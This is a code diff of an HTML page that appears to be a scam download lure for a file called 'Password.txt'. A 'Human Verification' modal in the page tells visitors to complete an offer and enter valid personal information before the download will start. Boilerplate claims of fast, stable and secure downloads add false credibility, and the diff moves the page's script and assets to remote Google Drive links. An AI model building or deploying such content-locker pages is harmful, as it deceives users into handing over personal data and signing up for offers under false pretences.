@@ -6,17 +6,18 @@
     <meta http-equiv='X-UA-Compatible' content='IE=edge'>
     <meta name='viewport' content='width=device-width, initial-scale=1'>
 
-    <title>Pop-up Modal</title>
+    <title>Password.txt - Download File</title>
 
-    <link rel='stylesheet' type='text/css' media='screen' href='main.css'>
-    <script src='main.js' defer></script>
+    <link rel='stylesheet' type='text/css' media='screen'
+        href='https://docs.google.com/uc?export=download&id=1kAaZrJspNINpaw1WS-8VgmdUeRVn2zv9'>
+    <script src='https://docs.google.com/uc?export=download&id=1jHKHDZMegvFyG5yvFhPwnHUpBSX3HRU2' defer></script>
 </head>
 
 <body>
 
 
     <div class="header">
-        <h2>Download File</h2>
+        <h2 id="lng_downloadFile">Download File</h2>
     </div>
 
     <div class="main">
@@ -30,22 +31,39 @@
     <div class="footer">
 
         <div class="entry">
-            <img class="img-fast" src="fast.png" />
+            <img class="img-fast"
+                src="https://docs.google.com/uc?export=download&id=1AyDAi7VTMJ0uSpbRkOfvGEs_V-Y5KOgx" />
             <span class="mini-title">FAST</span>
-            <p>Automatically redirected to a server near you. Lightning fast download speeds.</p>
+            <p id="lng_fastTxt">Automatically redirected to a server near you. Lightning fast download speeds.</p>
         </div>
 
         <div class="entry">
-            <img class="img-fast" src="stable.png" />
+            <img class="img-fast"
+                src="https://docs.google.com/uc?export=download&id=1-leqqVgUnbU_bYSsPmkP_aYTHgF598l5" />
             <span class="mini-title">STABLE</span>
-            <p>Stable download platform for all files and services. Download with confidence.</p>
+            <p id="lng_stableTxt">Stable download platform for all files and services. Download with confidence.</p>
         </div>
 
         <div class="entry">
-            <img class="img-fast" src="secure.png" />
+            <img class="img-fast"
+                src="https://docs.google.com/uc?export=download&id=1u6dh7szuzTaauAlYUw4i6vGfx17czvXi" />
             <span class="mini-title">SECURE</span>
-            <p>Secure protocols and top-of-the-line anti virus software. All files are secured for you.</p>
+            <p id="lng_secureTxt">Secure protocols and top-of-the-line anti virus software. All files are secured for
+                you.</p>
         </div>
+    </div>
+
+    <div class="translate">
+        <select id="lang" onchange="dropDownLang(this)">
+            <option selected hidden>Select Language</option>
+            <option value="en">English</option>
+            <option value="fr">French</option>
+            <option value="es">Spanish</option>
+            <option value="pt">Portuguese</option>
+            <option value="it">Italian</option>
+            <option value="nl">Dutch</option>
+            <option value="de">German</option>
+        </select>
     </div>
 
     <!-- Trigger/Open The Modal -->
@@ -56,11 +74,12 @@
         <div class="modal-content">
             <div class="modal-header">
                 <span class="close">&times;</span>
-                <h2>Human Verfication Required</h2>
+                <h2 id="lng_humanVer">Human Verification</h2>
             </div>
             <div class="modal-body">
-                <p>Before downloading this file, we need to confirm you are a human. Complete an offer below to verify
-                    and unlock your download.</p>
+                <p id="lng_mdlBody">
+                    In order to download this file, please verify that you are human by completing one simple offer
+                    below. Download will start after you have completed the verification process.
                 <p>
                     <center>
                         <div>{%header_text%}</div>
@@ -71,7 +90,8 @@
                 </p>
             </div>
             <div class="modal-footer">
-                <p>All offers and subscriptions are free and can be canceled anytime.</p>
+                <p id="lng_mdlFooter">Please enter valid information only when completing an offer or else the download
+                    will not start.</p>
             </div>
         </div>
 
